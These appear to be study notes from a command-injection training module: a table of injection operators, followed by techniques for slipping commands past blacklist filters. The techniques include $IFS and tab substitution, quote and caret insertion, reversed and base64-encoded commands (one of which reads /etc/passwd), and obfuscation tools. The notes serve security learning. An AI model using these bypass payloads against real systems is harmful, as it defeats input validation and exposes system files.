| **Injection Type**                      | **Operators**                                     |
| --------------------------------------- | ------------------------------------------------- |
| SQL Injection                           | `'` `,` `;` `--` `/* */`                          |
| Command Injection                       | `;` `&&`                                          |
| LDAP Injection                          | `*` `(` `)` `&` `\|`                              |
| XPath Injection                         | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection                    | `;` `&` `\|`                                      |
| Code Injection                          | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`  |
| Directory Traversal/File Path Traversal | `../` `..\\` `%00`                                |
| Object Injection                        | `;` `&` `\|`                                      |
| XQuery Injection                        | `'` `;` `--` `/* */`                              |
| Shellcode Injection                     | `\x` `\u` `%u` `%n`                               |
| Header Injection                        | `\n` `\r\n` `\t` `%0d` `%0a` `%09`                |
# Filter Evasion
## Bypass Blacklisted Operators
Just try.
## Bypass Blacklisted Spaces
#### Using Tabs
Using tabs (%09) instead of spaces is a technique that may work, as both Linux and Windows accept commands with tabs between arguments, and they are executed the same.
#### Using $IFS

Using the (\$IFS) Linux Environment Variable may also work since its default value is a space and a tab, which would work between command arguments. So, if we use `${IFS}` where the spaces should be, the variable should be automatically replaced with a space, and our command should work.

#### Using Brace Expansion

There are many other methods we can utilize to bypass space filters. For example, we can use the `Bash Brace Expansion` feature, which automatically adds spaces between arguments wrapped between braces, as follows:

```shell
$ {ls,-la}
```

#### Using Linux Environment Variables

```shell
echo ${PATH:0:1}
/
```
```shell
echo ${LS_COLORS:10:1}

;
```

### Windows

The same concept works on Windows as well. For example, to produce a slash in `Windows Command Line (CMD)`, we can `echo` a Windows variable (`%HOMEPATH%` -> `\Users\user`), and then specify a starting position (`~6` -> `\user`), and finally specifying a negative end position, which in this case is the length of the username `htb-student` (`-11` -> `\`) :

Bypassing Other Blacklisted Characters

```cmd-session
C:\user> echo %HOMEPATH:~6,-11%

\
```

## Character Shifting

There are other techniques to produce the required characters without using them, like `shifting characters`. For example, the following Linux command shifts the character we pass by `1`. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with `man ascii`), then add it instead of `[` in the below example. This way, the last printed character would be the one we need:

```shell
$ man ascii     # \ is on 92, before it is [ on 91
$ echo $(tr '!-}' '"-~'<<<[)

\
```

# Bypassing Blacklisted Commands
## Linux & Windows

One very common and easy obfuscation technique is inserting certain characters within our command that are usually ignored by command shells like `Bash` or `PowerShell` and will execute the same command as if they were not there. Some of these characters are a single-quote `'` and a double-quote `"`, in addition to a few others.

The easiest to use are quotes, and they work on both Linux and Windows servers. For example, if we want to obfuscate the `whoami` command, we can insert single quotes between its characters, as follows:

Bypassing Blacklisted Commands

```shell
$ w'h'o'am'i

user
```

The same works with double-quotes as well:

Bypassing Blacklisted Commands

```shell
$ w"h"o"am"i

user
```

### Linux Only

We can insert a few other Linux-only characters in the middle of commands, and the bash shell would ignore them and execute the command. These characters include the backslash \ and the positional parameter character $@. This works exactly as it did with the quotes, but in this case, the number of characters do not have to be even, and we can insert just one of them if we want to:
Code: bash

```shell
who$@ami
w\ho\am\i
```
### Windows Only

There are also some Windows-only characters we can insert in the middle of commands that do not affect the outcome, like a caret (`^`) character, as we can see in the following example:

Bypassing Blacklisted Commands

```cmd
C:\user> who^ami

21y4d
```

## Case Manipulation
When it comes to Linux and a bash shell, which are case-sensitive we have to get a bit creative and find a command that turns the command into an all-lowercase word. One working command we can use is the following:


```shell
$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

home
```

## Reversed Commands
```shell
$ $(rev<<<'imaohw')
```

```powershell
C:\user> iex "$('imaohw'[-1..-20] -join '')"
```

## Encoded Commands
```shell
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

```powershell
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

## Evasion Tools
## Linux (Bashfuscator)

A handy tool we can utilize for obfuscating bash commands is [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator). We can clone the repository from GitHub and then install its requirements, as follows:
```shell
$ ./bashfuscator -c 'cat /etc/passwd'

[+] Mutators used: Token/ForCode -> Command/Reverse
[+] Payload:
 ${*/+27\[X\(} ...SNIP...  ${*~}   
[+] Payload size: 1664 characters
```
## Windows (DOSfuscation)
```powershell
PS C:\user> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\user> Invoke-DOSfuscation

Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1
```